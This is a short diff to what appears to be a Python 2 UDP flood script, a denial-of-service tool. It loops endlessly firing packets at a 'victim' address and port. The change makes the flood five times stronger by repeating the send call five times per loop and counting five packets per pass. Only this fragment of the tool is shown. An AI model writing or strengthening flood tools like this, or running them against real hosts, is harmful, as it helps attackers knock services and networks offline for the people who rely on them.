@@ -27,9 +27,13 @@ while 1:
 		pass
 	try:
 		client.sendto(bytes, (victim, vport))
+		client.sendto(bytes, (victim, vport))
+		client.sendto(bytes, (victim, vport))
+		client.sendto(bytes, (victim, vport))
+		client.sendto(bytes, (victim, vport))
 	except ValueError:
 		pass
 	except:
 		pass
-	sent = sent + 1
+	sent = sent + 5
 	print "%s Packets: %s Port: %s "%(sent, victim, vport)
